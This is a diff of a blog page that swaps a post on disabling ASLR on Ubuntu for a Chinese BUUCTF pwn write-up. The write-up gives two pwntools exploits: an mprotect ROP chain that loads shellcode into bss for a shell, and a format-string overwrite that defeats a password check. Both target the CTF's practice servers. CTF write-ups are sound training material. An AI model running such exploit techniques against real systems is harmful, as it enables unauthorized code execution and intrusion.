@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Linux,Ubuntu,ASLR,">
+  <meta name="keywords" content="pwn,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="如何关闭Ubuntu16.04上的ASLR呢！">
-<meta name="keywords" content="Linux,Ubuntu,ASLR">
+<meta name="description" content="buu刷题受虐之旅（x2）~">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Ubuntu关闭ASLR">
-<meta property="og:url" content="http://suvii22.github.io/2019/10/29/Ubuntu关闭ASLR/index.html">
+<meta property="og:title" content="get_started&amp;PWN5">
+<meta property="og:url" content="http://suvii22.github.io/2019/12/01/get-started-PWN5/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
-<meta property="og:description" content="如何关闭Ubuntu16.04上的ASLR呢！">
+<meta property="og:description" content="buu刷题受虐之旅（x2）~">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-11-24T12:43:30.881Z">
+<meta property="og:updated_time" content="2019-12-01T11:24:25.992Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ubuntu关闭ASLR">
-<meta name="twitter:description" content="如何关闭Ubuntu16.04上的ASLR呢！">
+<meta name="twitter:title" content="get_started&amp;PWN5">
+<meta name="twitter:description" content="buu刷题受虐之旅（x2）~">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://suvii22.github.io/2019/10/29/Ubuntu关闭ASLR/">
+  <link rel="canonical" href="http://suvii22.github.io/2019/12/01/get-started-PWN5/">
 
 
 
 
 
-  <title>Ubuntu关闭ASLR | Apr1L's blog</title>
+  <title>get_started&PWN5 | Apr1L's blog</title>
   
 
 
@@ -273,7 +273,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/10/29/Ubuntu关闭ASLR/">
+    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/12/01/get-started-PWN5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Apr1L">
@@ -290,7 +290,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Ubuntu关闭ASLR</h1>
+          <h1 class="post-title" itemprop="name headline">get_started&PWN5</h1>
         
 
         <div class="post-meta">
@@ -302,8 +302,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-29T16:53:22+08:00">
-                2019-10-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-01T19:08:44+08:00">
+                2019-12-01
               </time>
             
 
@@ -325,8 +325,30 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/wp/" itemprop="url" rel="index">
+                    <span itemprop="name">wp</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/wp/BUUCTF/" itemprop="url" rel="index">
+                    <span itemprop="name">BUUCTF</span>
                   </a>
                 </span>
 
@@ -362,17 +384,14 @@
       
 
       
-        <blockquote class="blockquote-center"><p>如何关闭Ubuntu16.04上的ASLR呢！ </p>
+        <blockquote class="blockquote-center"><p>buu<del>刷题</del>受虐之旅（x2）~ </p>
 </blockquote>
 <a id="more"></a>
-<p>确认ASLR是否已经被打开，“2”表示已经打开</p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">suv11<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>cat /proc/sys/kernel/randomize_va_space </span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<h2 id="get-started"><a href="#get-started" class="headerlink" title="get_started"></a>get_started</h2><p>通过mprotect让.got.plt段和bss段有rwx权限，然后把shellcode read到bss段</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote('node3.buuoj.cn',28269)</span><br><span class="line"><span class="comment">#p = process('./get_started')</span></span><br><span class="line">elf = ELF('./get_started')</span><br><span class="line">pop3 = 0x0804f460</span><br><span class="line">payload = 'a'*0x38+p32(elf.symbols['mprotect'])</span><br><span class="line">payload+=p32(pop3)+p32(0x080EB000)+p32(0x1000)+p32(0x7)</span><br><span class="line">payload+=p32(elf.symbols['read'])+p32(pop3)+p32(0)+p32(0x080EBF81)+p32(0x100)</span><br><span class="line">payload+=p32(0x080EBF81)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>直接使用sudo会出现下面结果：</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">suv11<span class="meta">@ubuntu</span>:~$ sudo echo <span class="number">0</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space</span><br><span class="line"><span class="string">bash:</span> <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span><span class="string">randomize_va_space:</span> 权限不够</span><br></pre></td></tr></table></figure>
-
-<p>切换至root下关闭ASLR：</p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">suv11<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>su</span><br><span class="line">密码： </span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:/home/suv11</span><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:/home/suv11</span><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:/home/suv11</span><span class="comment"># su suv11</span></span><br><span class="line">suv11<span class="variable">@ubuntu</span><span class="symbol">:~</span>$</span><br></pre></td></tr></table></figure>
+<h2 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h2><p>观察源码发现存在格式化字符串漏洞，所以可以利用它造成任意地址读写，修改随机数数据<br>参考：<a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">格式化字符串漏洞</a></p>
+<figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn5')</span></span><br><span class="line">p = remote('node3.buuoj.cn',25241)</span><br><span class="line"><span class="comment">#offset = 10</span></span><br><span class="line">addr = 0x0804c044</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(10, &#123;<span class="attribute">addr</span>:0x10&#125;)</span><br><span class="line">p<span class="variable">.recvuntil</span>('your name:')</span><br><span class="line"></span><br><span class="line">p<span class="variable">.sendline</span>(payload)</span><br><span class="line">p<span class="variable">.recvuntil</span>('your passwd:')</span><br><span class="line">p<span class="variable">.sendline</span>(str(0x10))</span><br><span class="line"></span><br><span class="line">p<span class="variable">.interactive</span>()</span><br></pre></td></tr></table></figure>
 
 
       
@@ -391,11 +410,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Linux/" rel="tag"># Linux</a>
-          
-            <a href="/tags/Ubuntu/" rel="tag"># Ubuntu</a>
-          
-            <a href="/tags/ASLR/" rel="tag"># ASLR</a>
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
       
@@ -408,8 +423,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/27/HITCON-training-lab-10-hacknote/" rel="next" title="HITCON-training lab 10 hacknote">
-                <i class="fa fa-chevron-left"></i> HITCON-training lab 10 hacknote
+              <a href="/2019/11/30/babyheap/" rel="next" title="babyheap">
+                <i class="fa fa-chevron-left"></i> babyheap
               </a>
             
           </div>
@@ -417,10 +432,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/11/04/Syc-Geek-10th-Baby-canary/" rel="prev" title="Syc Geek 10th -Baby canary">
-                Syc Geek 10th -Baby canary <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -472,8 +483,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -535,6 +555,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started"><span class="nav-number">1.</span> <span class="nav-text">get_started</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN5"><span class="nav-number">2.</span> <span class="nav-text">PWN5</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
